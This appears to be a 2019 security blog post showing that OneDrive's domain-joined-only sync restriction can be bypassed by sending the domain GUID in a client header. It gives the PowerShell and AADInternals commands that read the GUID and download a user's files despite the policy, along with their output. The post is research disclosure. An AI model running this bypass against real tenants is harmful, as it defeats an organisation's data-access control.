+++
title = "Bypassing OneDrive sync domain restrictions"
date = "2019-12-11"
lastmod = "2020-01-19"
categories =["blog"]
tags = ["OneDrive","Office365","AADInternals","Security"]
thumbnail = "/images/posts/OneDriveSync.png"
+++

OneDrive has a <a href="https://docs.microsoft.com/en-us/onedrive/allow-syncing-only-on-specific-domains" target="_blank">security option</a> to allow syncing only from PCs joined to specific domains.
In this blog, using the latest <a href="/aadinternals/#onedrive-for-business-functions">AADInternals</a> toolkit (announced at <a href="https://www.blackhat.com/eu-19/arsenal/schedule/index.html#aadinternals-powershell-module-for-administering-azure-ad-and-office--18117" target ="_blank">Black Hat Europe</a> 2019),  I'll show how the domain restrictions can be easily bypassed.

<!--more-->

# OneDrive synchronization client
OneDrive synchronization client (OneDrive.exe) is a client used to sync files between cloud (OneDrive & SharePoint) and computers. 
While this is a powerfull tool to keep your files current, it has some security issues. <br><br>
As one can connect to Office 365 and OneDrive from any computer, this allows downloading files to also computers that are not managed by the corporation. And this is not a good thing from security point-of-view.<br><br>
To address this issue, there is an option at <a href="https://admin.onedrive.com/?v=SyncSettings" target="_blank">OneDrive admin center</a> where the sync can be limited to PCs joined to specific domains.

<img src="/images/posts/OneDriveSync2.png">


This can also be set and viewed using PowerShell:
{{< highlight powershell >}}
# Get the SharePoint Online sync client restrictions
Get-SPOTenantSyncClientRestriction
{{< /highlight>}}
In this tenant, the restriction is enabled and limited to computers joined to the domain with guid of {667965e7-de8e-440d-adc3-371a35474a41}.
```
TenantRestrictionEnabled : True
AllowedDomainList        : {667965e7-de8e-440d-adc3-371a35474a41}
BlockMacSync             : True
ExcludedFileExtensions   : {}
OptOutOfGrooveBlock      : False
OptOutOfGrooveSoftBlock  : False
```

# How does the domain restriction work?
The OneDrive, as the most of the Office products and tools, is using REST APIs. So, the traffic between the OneDrive client and cloud is HTTP-based. 
Now, as the traffic is HTTP I started to wonder how does the cloud side know which domain the computer is joined. 
A quick check with Fiddler showed that the client sends a special header **X-MachineDomainInfo** containing the **domain guid** of the computer the OneDrive.exe is running on. <br><br>
As such, this really is not an security feature at all, as one can bypass the restriction as long as the guid is know.

To get a domain guid from a domain joined PC:
{{< highlight powershell >}}
# Get the domain name and guid
Get-WmiObject -Class Win32_NTDomain | select DomainName,DomainGuid
{{< /highlight>}}

The output should be similar to following, depending on the number of domains of the AD forest:
```
DomainName  DomainGuid                            
----------  ----------                            

COMPANY.COM {667965e7-de8e-440d-adc3-371a35474a41}
```

# Passing the domain restrictions
Version 0.2.7 of <a href="/aadinternals/#onedrive-for-business-functions">AADInternals</a> contains functions for downloading from and sending files to OneDrive for Business.

First, a OneDriveSettings object needs to created. This can be done using credentials, Kerberos ticket, SAML token, or interactive login as below (promtps twice for both OfficeApps and OneDrive APIs):
{{< highlight powershell >}}
# Create a new OneDriveSettings object
$os = New-AADIntOneDriveSettings
{{< /highlight>}}

Next, you can try to dowload the files from the user's OneDrive:
{{< highlight powershell >}}
# Download the files from user's OneDrive
Get-AADIntOneDriveFiles -OneDriveSettings $os | Format-Table
{{< /highlight>}}

If you got an error similar to following, the domain restrictions apply:
```
Invoke-ODCommand : Got 501 - try using a proper domain guid
At C:\Program Files\WindowsPowerShell\Modules\AADInternals\OneDrive.ps1:120 char:25
+ ... $response = Invoke-ODCommand -Command $command -OneDriveSettings $One ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke-ODCommand
```

Now let's try again with the domain guid from the screenshot above:
{{< highlight powershell >}}
# Download the files from user's OneDrive with domain guid
Get-AADIntOneDriveFiles -OneDriveSettings $os -DomainGuid "667965e7-de8e-440d-adc3-371a35474a41" | Format-Table
{{< /highlight>}}

And now the files are downloading!

```
Path                              Size  Created            Modified           ResourceID                   
----                              ----  -------            --------           ----------                   
\RootFolder\Document1.docx        11032 2.12.2019 20.47.23 2.12.2019 20.48.46 5e7acf393a2e45f18c1ce6caa7...
\RootFolder\Book.xlsx             8388  2.12.2019 20.49.14 2.12.2019 20.50.14 b26c0a38d4d14b23b785576e29...
\RootFolder\Docs\Document1.docx   84567 9.12.2019 11.24.40 9.12.2019 12.17.50 d9d51e47b66c4805aff3a08763...
\RootFolder\Docs\Document2.docx   31145 7.12.2019 17.28.37 7.12.2019 17.28.37 972f9c317e1e468fb2b6080ac2...
```